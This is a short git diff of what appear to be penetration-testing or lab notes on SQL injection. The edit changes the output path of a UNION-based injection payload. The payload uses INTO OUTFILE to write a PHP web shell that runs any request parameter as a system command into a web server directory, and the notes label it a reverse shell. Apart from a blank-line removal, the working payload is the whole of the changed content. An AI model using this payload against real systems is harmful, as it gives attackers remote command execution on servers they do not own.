@@ -15,7 +15,6 @@ Find the numbers of columns
 
 <img width="580" height="242" alt="image" src="https://github.com/user-attachments/assets/f49e9d3f-ed74-4a4f-be3b-11da01a80afb" />
 
-
 Payload
 ```bash
 # Gathering information
@@ -60,5 +59,5 @@ NOte: result shows that the secure_file_priv value is empty, meaning that we can
 
 - Create a Reverse SHell
 ```bash
-cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- - 
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/chattr-prod/shell.php'-- - 
 ```
